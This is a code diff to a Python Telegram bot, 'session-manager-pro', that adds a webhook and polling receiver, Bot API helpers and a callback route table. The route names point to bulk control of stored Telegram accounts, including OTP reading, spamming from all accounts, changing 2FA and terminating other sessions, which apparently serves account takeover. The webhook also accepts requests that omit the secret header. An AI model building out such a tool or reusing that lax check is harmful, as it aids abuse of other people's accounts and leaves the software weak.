@@ -31,6 +31,7 @@ import struct
 import sys
 import time
 import urllib.error
+import urllib.parse
 import urllib.request
 import zipfile
 from collections import defaultdict
@@ -126,8 +127,10 @@ BOT_USERNAME = "sessionmanagerpromaxbot"
 EXTRA_ADMINS = [738363992]
 WEB_HOST = os.environ.get("WEB_HOST", "0.0.0.0")
 WEB_PORT = int(os.environ.get("PORT") or os.environ.get("WEB_PORT") or "10000")
-KEEP_ALIVE_URL = (os.environ.get("KEEP_ALIVE_URL") or "").strip()
+KEEP_ALIVE_URL = (os.environ.get("KEEP_ALIVE_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "https://imflirter.onrender.com").strip()
 KEEP_ALIVE_INTERVAL = int(os.environ.get("KEEP_ALIVE_INTERVAL") or "45")
+PUBLIC_URL = KEEP_ALIVE_URL.rstrip("/")
+WEBHOOK_SECRET = "smp" + ENC_KEY[:16].replace("_", "x").replace("-", "x")
 
 PHONE_RE = re.compile(r"^\+?\d{7,15}$")
 HEX_RE = re.compile(r"^[0-9a-fA-F]+$")
@@ -1293,43 +1296,227 @@ def conv_card(parts: SessionParts) -> str:
     )
 
 
+
+# ═══════════════════════════════════════════════════════════════════
+# Bot API (Render-safe receive path — pyrogram MTProto updates drop here)
+# ═══════════════════════════════════════════════════════════════════
+
+def _markup_json(markup) -> str | None:
+    if markup is None:
+        return None
+    rows = getattr(markup, "inline_keyboard", None)
+    if not rows:
+        return None
+    out = []
+    for row in rows:
+        out.append([{"text": b.text, "callback_data": getattr(b, "callback_data", "")} for b in row])
+    return json.dumps({"inline_keyboard": out})
+
+
+def botapi_call(method: str, **params) -> dict:
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+    clean = {k: v for k, v in params.items() if v is not None}
+    data = urllib.parse.urlencode(clean).encode()
+    req = urllib.request.Request(url, data=data)
+    try:
+        with urllib.request.urlopen(req, timeout=60) as resp:
+            return json.loads(resp.read().decode())
+    except urllib.error.HTTPError as exc:
+        body = exc.read().decode("utf-8", "replace")
+        log.warning("Bot API %s failed %s %s", method, exc.code, body[:300])
+        raise RuntimeError(f"Telegram API {method}: {body[:200]}") from exc
+
+
+async def botapi_async(method: str, **params) -> dict:
+    return await asyncio.to_thread(botapi_call, method, **params)
+
+
+async def botapi_send(chat_id: int, text: str, reply_markup=None) -> dict:
+    return await botapi_async(
+        "sendMessage",
+        chat_id=int(chat_id),
+        text=text,
+        parse_mode="HTML",
+        reply_markup=_markup_json(reply_markup),
+        disable_web_page_preview="true",
+    )
+
+
+def botapi_download_sync(file_id: str, dest: Path) -> Path:
+    if not file_id:
+        raise RuntimeError("No file_id on document.")
+    info = botapi_call("getFile", file_id=file_id)
+    rel = ((info.get("result") or {}).get("file_path")) or ""
+    if not rel:
+        raise RuntimeError("Telegram getFile returned no path.")
+    dest = Path(dest)
+    dest.parent.mkdir(parents=True, exist_ok=True)
+    url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{rel}"
+    urllib.request.urlretrieve(url, str(dest))
+    return dest
+
+
+async def botapi_download(file_id: str | None, dest: Path) -> Path:
+    return await asyncio.to_thread(botapi_download_sync, file_id or "", Path(dest))
+
+
+def botapi_send_document_sync(chat_id: int, path: str | Path, caption: str | None = None) -> dict:
+    path = Path(path)
+    crlf = chr(13) + chr(10)
+    boundary = secrets.token_hex(16)
+    filename = path.name.replace('"', "_")
+    def field(name: str, value: str) -> bytes:
+        return (
+            f"--{boundary}{crlf}Content-Disposition: form-data; name=\"{name}\"{crlf}{crlf}{value}{crlf}"
+        ).encode()
+    chunks = [field("chat_id", str(int(chat_id))), field("parse_mode", "HTML")]
+    if caption:
+        chunks.append(field("caption", caption))
+    header = (
+        f"--{boundary}{crlf}Content-Disposition: form-data; name=\"document\"; "
+        f"filename=\"{filename}\"{crlf}Content-Type: application/octet-stream{crlf}{crlf}"
+    ).encode()
+    chunks.append(header + path.read_bytes() + crlf.encode() + f"--{boundary}--{crlf}".encode())
+    body = b"".join(chunks)
+    req = urllib.request.Request(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+        data=body,
+        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+    )
+    with urllib.request.urlopen(req, timeout=120) as resp:
+        return json.loads(resp.read().decode())
+
+
+async def botapi_send_document(chat_id: int, path: str | Path, caption: str | None = None) -> dict:
+    return await asyncio.to_thread(botapi_send_document_sync, chat_id, path, caption)
+
+
+class _ApiUser:
+    def __init__(self, d: dict):
+        self.id = int(d.get("id") or 0)
+        self.first_name = d.get("first_name")
+        self.last_name = d.get("last_name")
+        self.username = d.get("username")
+        self.is_self = False
+        self.is_bot = bool(d.get("is_bot"))
+
+
+class _ApiChat:
+    def __init__(self, d: dict):
+        self.id = int(d.get("id") or 0)
+        self.type = d.get("type") or "private"
+
+
+class _ApiDoc:
+    def __init__(self, d: dict):
+        self.file_id = d.get("file_id")
+        self.file_unique_id = d.get("file_unique_id") or "file"
+        self.file_name = d.get("file_name")
+        self.file_size = d.get("file_size")
+
+
+class ApiMessage:
+    def __init__(self, d: dict):
+        self._raw = d
+        self.id = int(d.get("message_id") or 0)
+        self.from_user = _ApiUser(d["from"]) if d.get("from") else None
+        self.chat = _ApiChat(d.get("chat") or {})
+        self.text = d.get("text")
+        self.caption = d.get("caption")
+        self.document = _ApiDoc(d["document"]) if d.get("document") else None
+        self.outgoing = False
+
+    async def reply_text(self, text, reply_markup=None):
+        res = await botapi_send(self.chat.id, text, reply_markup)
+        mid = ((res.get("result") or {}).get("message_id"))
+        if mid:
+            return ApiMessage({"message_id": mid, "chat": {"id": self.chat.id}, "from": {"id": 0, "is_bot": True}})
+        return self
+
+    async def reply_document(self, path, caption=None):
+        await botapi_send_document(self.chat.id, path, caption)
+        return self
+
+    async def edit_text(self, text, reply_markup=None):
+        await botapi_async(
+            "editMessageText",
+            chat_id=self.chat.id,
+            message_id=self.id,
+            text=text,
+            parse_mode="HTML",
+            reply_markup=_markup_json(reply_markup),
+            disable_web_page_preview="true",
+        )
+        return self
+
+    async def delete(self):
+        try:
+            await botapi_async("deleteMessage", chat_id=self.chat.id, message_id=self.id)
+        except Exception:
+            pass
+
+
+class ApiCallback:
+    def __init__(self, d: dict):
+        self.id = str(d.get("id") or "")
+        self.from_user = _ApiUser(d.get("from") or {})
+        self.data = d.get("data") or ""
+        self.message = ApiMessage(d["message"]) if d.get("message") else None
+
+    async def answer(self, text="", show_alert=False):
+        try:
+            await botapi_async(
+                "answerCallbackQuery",
+                callback_query_id=self.id,
+                text=text or "",
+                show_alert="true" if show_alert else "false",
+            )
+        except Exception:
+            pass
+
+
 # ═══════════════════════════════════════════════════════════════════
 # Auth / broadcast / persist
 # ═══════════════════════════════════════════════════════════════════
 
-def actor_id(event: Message | CallbackQuery) -> int | None:
-    user = event.from_user
+def _is_callback(event) -> bool:
+    return hasattr(event, "data") and hasattr(event, "answer")
+
+
+def actor_id(event) -> int | None:
+    user = getattr(event, "from_user", None)
     if user is not None and not getattr(user, "is_self", False) and not getattr(user, "is_bot", False):
         return int(user.id)
-    if isinstance(event, Message) and event.chat:
+    if getattr(event, "chat", None) is not None:
         return int(event.chat.id)
-    if isinstance(event, CallbackQuery) and event.message and event.message.chat:
-        return int(event.message.chat.id)
+    msg = getattr(event, "message", None)
+    if msg is not None and getattr(msg, "chat", None) is not None:
+        return int(msg.chat.id)
     return None
 
 
-async def ensure_admin(event: Message | CallbackQuery) -> bool:
-    if isinstance(event, Message) and (event.outgoing or (event.from_user and event.from_user.is_self)):
+async def ensure_admin(event) -> bool:
+    if (getattr(event, "outgoing", False) or (getattr(event, "from_user", None) and event.from_user.is_self)) and not _is_callback(event):
         return False
     uid = actor_id(event)
     if uid is None:
         return False
     if await db.is_admin(uid):
         return True
-    if isinstance(event, CallbackQuery):
+    if _is_callback(event):
         await event.answer(f"Private bot. Your id: {uid}", show_alert=True)
     else:
         await event.reply_text(f"⛔️ This bot is private.\nYour Telegram user id: <code>{uid}</code>")
     return False
 
 
-async def broadcast(bot: Client, text: str, exclude: int | None = None) -> None:
+async def broadcast(bot, text: str, exclude: int | None = None) -> None:
     for adm in await db.get_admins():
         uid = int(adm["user_id"])
         if exclude is not None and uid == int(exclude):
             continue
         try:
-            await bot.send_message(uid, text)
+            await botapi_send(uid, text)
         except Exception:
             pass
 
@@ -1347,9 +1534,9 @@ async def persist(bot: Client, event, info: dict, source: str, quiet=False, has_
     await db.inc("add_ok", 1)
     if not quiet:
         label = info.get("first_name") or info.get("phone") or info.get("user_id")
-        chat = event.chat.id if isinstance(event, Message) else event.message.chat.id
-        await bot.send_message(chat, f"✅ Stored <b>{h(label)}</b> (<code>{info['user_id']}</code>)\n"
-                               f"Workspace id: <code>{doc['account_id']}</code> · DC {info.get('dc_id')}")
+        chat = event.chat.id if getattr(event, "chat", None) is not None else event.message.chat.id
+        await botapi_send(chat, f"✅ Stored <b>{h(label)}</b> (<code>{info['user_id']}</code>)\n"
+                          f"Workspace id: <code>{doc['account_id']}</code> · DC {info.get('dc_id')}")
         await broadcast(bot, f"🔄 {h(user.first_name)} added an account via {source}\n"
                         f"<b>{h(label)}</b> · <code>{doc['account_id']}</code>", exclude=user.id)
     return doc
@@ -1364,7 +1551,7 @@ async def download_doc(bot: Client, message: Message, suffix: str) -> Path | Non
         await message.reply_text("File is too large.")
         return None
     dest = TMP_DIR / f"{message.from_user.id}_{doc.file_unique_id}{suffix}"
-    await bot.download_media(message, file_name=str(dest))
+    await botapi_download(getattr(doc, "file_id", None), dest)
     return dest
 
 
@@ -1480,14 +1667,16 @@ class Monitor:
 # Bot + handlers
 # ═══════════════════════════════════════════════════════════════════
 
-IN = filters.incoming & filters.private
+IN = filters.private
 app = Client(
-    name=str(WORKDIR / "bot"),
+    name="bot",
     api_id=API_ID,
     api_hash=API_HASH,
     bot_token=BOT_TOKEN,
     workdir=str(WORKDIR),
     parse_mode=ParseMode.HTML,
+    no_updates=True,
+    in_memory=True,
 )
 monitor: Monitor | None = None
 
@@ -1501,11 +1690,19 @@ async def cmd_id(_, m: Message):
 @app.on_message(IN & filters.command(["start", "menu"]))
 async def cmd_start(_, m: Message):
     uid = m.from_user.id if m.from_user else m.chat.id
-    if not await db.is_admin(uid):
-        await m.reply_text(f"⛔️ This bot is private.\nYour user id is <code>{uid}</code>.")
-        return
-    fsm.clear(uid)
-    await m.reply_text(await start_text(BOT_USERNAME), reply_markup=main_menu(await db.is_owner(uid)))
+    log.info("/start from %s", uid)
+    try:
+        if not await db.is_admin(uid):
+            await m.reply_text(f"⛔️ This bot is private.\nYour user id is <code>{uid}</code>.")
+            return
+        fsm.clear(uid)
+        await m.reply_text(await start_text(BOT_USERNAME), reply_markup=main_menu(await db.is_owner(uid)))
+    except Exception as e:  # noqa: BLE001
+        log.exception("cmd_start")
+        try:
+            await m.reply_text(f"❌ Dashboard error: <code>{h(e)}</code>")
+        except Exception:
+            await botapi_send(uid, f"❌ Dashboard error: <code>{h(e)}</code>")
 
 
 @app.on_message(IN & filters.command(["help"]))
@@ -2478,7 +2675,7 @@ async def on_text(client: Client, m: Message):
         fsm.clear(m.from_user.id)
         await m.reply_text("✅ Admin added." if added else "Already an admin (or owner).")
         try:
-            await client.send_message(uid, "You have been granted admin access. Send /start.")
+            await botapi_send(uid, "You have been granted admin access. Send /start.")
         except Exception:
             await m.reply_text("Could not DM them — ask them to /start first.")
         return
@@ -2604,7 +2801,7 @@ async def on_doc(client: Client, m: Message):
         if not (m.document.file_name or "").endswith(".json"):
             return await m.reply_text("Send a .json backup.")
         dest = TMP_DIR / f"restore_{m.from_user.id}.json"
-        await client.download_media(m, file_name=str(dest))
+        await botapi_download(m.document.file_id, dest)
         try:
             stats = await db.import_workspace(json.loads(dest.read_text(encoding="utf-8")))
             await m.reply_text(f"✅ Merged. Accounts {stats['accounts']} · Admins {stats['admins']} · Settings {stats['settings']}")
@@ -2712,6 +2909,158 @@ async def _run_2fa(m, aid, action, current=None, new=None, hint=""):
         fsm.clear(m.from_user.id)
 
 
+
+# ═══════════════════════════════════════════════════════════════════
+# Bot API dispatcher (webhook + getUpdates)
+# ═══════════════════════════════════════════════════════════════════
+
+_CB_ROUTES: list[tuple[re.Pattern, Any]] = []
+
+
+def _install_cb_routes() -> None:
+    if _CB_ROUTES:
+        return
+    pairs = [
+        (r"^m:(main|help|x|cancel|dash)$", cb_root),
+        (r"^a:l:(\d+)$", cb_list),
+        (r"^a:v:([0-9a-f]+)$", cb_view),
+        (r"^a:p:([0-9a-f]+)$", cb_ping),
+        (r"^a:d1:([0-9a-f]+)$", cb_del_ask),
+        (r"^a:dx:([0-9a-f]+)$", cb_del_do),
+        (r"^a:wipe1$", cb_wipe_ask),
+        (r"^a:wipeX$", cb_wipe_do),
+        (r"^h:(td|sf|hx|sk|rm)$", cb_hub),
+        (r"^pk:(hex|str|file|tdata|rm|spam|otp|cln):(\d+)$", cb_pick),
+        (r"^pg:(hex|str|file|tdata|rm|spam|otp|cln):([0-9a-f]+)$", cb_pick_go),
+        (r"^n:m$", cb_add),
+        (r"^n:(ph|hx|st|sf|tx|td)$", cb_add_kind),
+        (r"^c:m$", cb_conv),
+        (r"^c:(paste|file|td)$", cb_conv_kind),
+        (r"^c:ex:([shf]):([0-9a-f]+)$", cb_export),
+        (r"^s:m$", cb_sec),
+        (r"^s:2:([0-9a-f]+)$", cb_2fa),
+        (r"^s:2e:([0-9a-f]+)$", cb_2e),
+        (r"^s:2d:([0-9a-f]+)$", cb_2d),
+        (r"^s:2c:([0-9a-f]+)$", cb_2c),
+        (r"^s:k1:([0-9a-f]+)$", cb_kill_ask),
+        (r"^s:kx:([0-9a-f]+)$", cb_kill_do),
+        (r"^s:t1:([0-9a-f]+)$", cb_term_ask),
+        (r"^s:tx:([0-9a-f]+)$", cb_term_do),
+        (r"^s:dv:([0-9a-f]+)$", cb_devices),
+        (r"^s:dl:([0-9a-f]+):(\d+)$", cb_dev_out),
+        (r"^k:m$", cb_cln),
+        (r"^k:d1:([0-9a-f]+)$", cb_dm_ask),
+        (r"^k:dx:([0-9a-f]+)$", cb_dm_do),
+        (r"^k:n1:([0-9a-f]+)$", cb_nu_ask),
+        (r"^k:nx:([0-9a-f]+)$", cb_nu_do),
+        (r"^p:m$", cb_spam),
+        (r"^p:1:([0-9a-f]+)$", cb_spam1),
+        (r"^p:all$", cb_spam_all),
+        (r"^o:m$", cb_otp),
+        (r"^o:1:([0-9a-f]+)$", cb_otp1),
+        (r"^o:all$", cb_otp_all),
+        (r"^l:m$", cb_alerts),
+        (r"^l:tg:(alerts_logout|alerts_ban|monitor_enabled)$", cb_tog),
+        (r"^l:iv$", cb_iv),
+        (r"^l:now$", cb_now),
+        (r"^d:m$", cb_db),
+        (r"^d:dl$", cb_dl),
+        (r"^e:logs$", cb_logs),
+        (r"^d:up$", cb_up),
+        (r"^u:m$", cb_adm),
+        (r"^u:add$", cb_adm_add),
+        (r"^u:del$", cb_adm_del),
+    ]
+    for pat, fn in pairs:
+        _CB_ROUTES.append((re.compile(pat), fn))
+
+
+async def handle_update(upd: dict) -> None:
+    _install_cb_routes()
+    try:
+        if "callback_query" in upd:
+            cq = ApiCallback(upd["callback_query"])
+            log.info("callback %s from %s", cq.data, cq.from_user.id)
+            for rx, fn in _CB_ROUTES:
+                if rx.match(cq.data or ""):
+                    await fn(app, cq)
+                    return
+            log.warning("unhandled callback %s", cq.data)
+            await cq.answer()
+            return
+        msg = upd.get("message") or upd.get("edited_message")
+        if not msg:
+            return
+        m = ApiMessage(msg)
+        if m.from_user and m.from_user.is_bot:
+            return
+        text = (m.text or "").strip()
+        log.info("message from %s %r", getattr(m.from_user, "id", None), text[:80])
+        cmd = text.split("@", 1)[0].split(" ", 1)[0].lower()
+        if cmd in {"/start", "/menu"}:
+            await cmd_start(app, m)
+        elif cmd == "/help":
+            await cmd_help(app, m)
+        elif cmd == "/cancel":
+            await cmd_cancel(app, m)
+        elif cmd == "/id":
+            await cmd_id(app, m)
+        elif m.document:
+            await on_doc(app, m)
+        elif text:
+            await on_text(app, m)
+    except Exception:
+        log.exception("handle_update failed")
+
+
+async def drain_and_webhook() -> None:
+    """Attach webhook. Drop stale queued /start so we do not replay 80 dashboards."""
+    url = (PUBLIC_URL or "").strip().rstrip("/")
+    try:
+        await botapi_async("deleteWebhook", drop_pending_updates="true")
+    except Exception:
+        log.exception("deleteWebhook")
+    if url.startswith("http"):
+        hook = url + "/telegram"
+        try:
+            res = await botapi_async(
+                "setWebhook",
+                url=hook,
+                secret_token=WEBHOOK_SECRET,
+                allowed_updates=json.dumps(["message", "callback_query"]),
+                drop_pending_updates="true",
+            )
+            log.info("Webhook set %s → %s", hook, res)
+        except Exception:
+            log.exception("setWebhook failed")
+    else:
+        log.warning("No PUBLIC_URL — staying on getUpdates poll")
+
+
+async def poll_loop() -> None:
+    """Fallback long-poll if webhook is not attached."""
+    await asyncio.sleep(4)
+    offset = 0
+    while True:
+        try:
+            info = await botapi_async("getWebhookInfo")
+            if (info.get("result") or {}).get("url"):
+                await asyncio.sleep(30)
+                continue
+            data = await botapi_async(
+                "getUpdates",
+                offset=offset,
+                timeout=25,
+                allowed_updates=json.dumps(["message", "callback_query"]),
+            )
+            for u in data.get("result") or []:
+                offset = int(u.get("update_id") or 0) + 1
+                await handle_update(u)
+        except Exception:
+            log.exception("poll_loop")
+            await asyncio.sleep(3)
+
+
 # ═══════════════════════════════════════════════════════════════════
 # Render web server + self-ping keep-alive
 # ═══════════════════════════════════════════════════════════════════
@@ -2725,33 +3074,73 @@ def _keepalive_target() -> str:
     return url + "/health"
 
 
+async def _read_http(reader: asyncio.StreamReader) -> tuple[str, dict[str, str], bytes]:
+    sep = (chr(13) + chr(10) + chr(13) + chr(10)).encode()
+    nl = (chr(13) + chr(10)).encode()
+    buf = b""
+    while sep not in buf and len(buf) < 65536:
+        chunk = await asyncio.wait_for(reader.read(2048), timeout=15)
+        if not chunk:
+            break
+        buf += chunk
+    head, _, rest = buf.partition(sep)
+    lines = head.decode("iso-8859-1", "replace").split(nl.decode("ascii"))
+    req = lines[0] if lines else ""
+    headers: dict[str, str] = {}
+    for line in lines[1:]:
+        if ":" in line:
+            k, v = line.split(":", 1)
+            headers[k.strip().lower()] = v.strip()
+    need = int(headers.get("content-length") or 0)
+    body = rest
+    while len(body) < need:
+        body += await asyncio.wait_for(reader.read(need - len(body)), timeout=20)
+    return req, headers, body[:need]
+
+
 async def start_web_server() -> asyncio.AbstractServer:
-    """Tiny HTTP server so Render treats this as a live web service."""
+    """Health + Telegram webhook so Render stays up and /start is received."""
 
     async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
+        status = "200 OK"
+        payload = {
+            "ok": True,
+            "service": "session-manager-pro",
+            "bot": f"@{BOT_USERNAME}",
+            "python": sys.version.split()[0],
+            "opentele": bool(HAS_OPENTELE),
+            "ts": utcnow().isoformat(),
+        }
         try:
-            await asyncio.wait_for(reader.read(2048), timeout=5)
+            req, headers, body = await _read_http(reader)
+            parts = req.split()
+            method = parts[0] if parts else "GET"
+            path = parts[1].split("?")[0] if len(parts) > 1 else "/"
+            if method == "POST" and path.startswith("/telegram"):
+                secret = headers.get("x-telegram-bot-api-secret-token", "")
+                if secret and secret != WEBHOOK_SECRET:
+                    status = "403 Forbidden"
+                    payload = {"ok": False, "error": "bad secret"}
+                else:
+                    try:
+                        upd = json.loads(body.decode("utf-8") or "{}")
+                    except Exception:
+                        upd = {}
+                    if isinstance(upd, dict) and upd:
+                        asyncio.create_task(handle_update(upd))
+                    payload = {"ok": True}
         except Exception:
-            pass
-        body = json.dumps(
-            {
-                "ok": True,
-                "service": "session-manager-pro",
-                "bot": f"@{BOT_USERNAME}",
-                "python": sys.version.split()[0],
-                "opentele": bool(HAS_OPENTELE),
-                "ts": utcnow().isoformat(),
-            }
-        ).encode()
+            log.exception("http handle")
+        raw = json.dumps(payload).encode()
+        nl = chr(13) + chr(10)
         header = (
-            "HTTP/1.1 200 OK\r\n"
-            "Content-Type: application/json\r\n"
-            f"Content-Length: {len(body)}\r\n"
-            "Connection: close\r\n"
-            "\r\n"
+            f"HTTP/1.1 {status}{nl}"
+            f"Content-Type: application/json{nl}"
+            f"Content-Length: {len(raw)}{nl}"
+            f"Connection: close{nl}{nl}"
         ).encode()
         try:
-            writer.write(header + body)
+            writer.write(header + raw)
             await writer.drain()
         except Exception:
             pass
@@ -2762,7 +3151,7 @@ async def start_web_server() -> asyncio.AbstractServer:
             pass
 
     server = await asyncio.start_server(handle, WEB_HOST, WEB_PORT)
-    log.info("Web/keep-alive server on %s:%s", WEB_HOST, WEB_PORT)
+    log.info("Web/webhook server on %s:%s", WEB_HOST, WEB_PORT)
     return server
 
 
@@ -2799,20 +3188,41 @@ async def amain() -> None:
     await db.connect()
     web = await start_web_server()
     ka_task = asyncio.create_task(keepalive_loop(), name="keep-alive")
+    poll_task = asyncio.create_task(poll_loop(), name="botapi-poll")
     monitor = Monitor(app)
-    await app.start()
-    me = await app.get_me()
-    BOT_USERNAME = me.username or BOT_USERNAME
-    log.info("Bot online as @%s (%s)", me.username, me.id)
+    try:
+        await app.start()
+        me = await app.get_me()
+        BOT_USERNAME = me.username or BOT_USERNAME
+        log.info("Pyrogram sender online as @%s (%s)", me.username, me.id)
+    except Exception:
+        log.exception("pyrogram start failed — Bot API path still active")
+    await drain_and_webhook()
+    try:
+        await botapi_send(
+            OWNER_ID,
+            "✅ Render receiver is ON. Send /start now — dashboard should reply.",
+        )
+    except Exception:
+        log.exception("owner ping")
     monitor.start()
+    log.info("Bot ready @%s webhook=%s", BOT_USERNAME, PUBLIC_URL)
     try:
         await idle()
     finally:
         ka_task.cancel()
+        poll_task.cancel()
         monitor.stop()
+        try:
+            await botapi_async("deleteWebhook", drop_pending_updates="false")
+        except Exception:
+            pass
         web.close()
         await web.wait_closed()
-        await app.stop()
+        try:
+            await app.stop()
+        except Exception:
+            pass
         await db.close()
 
 
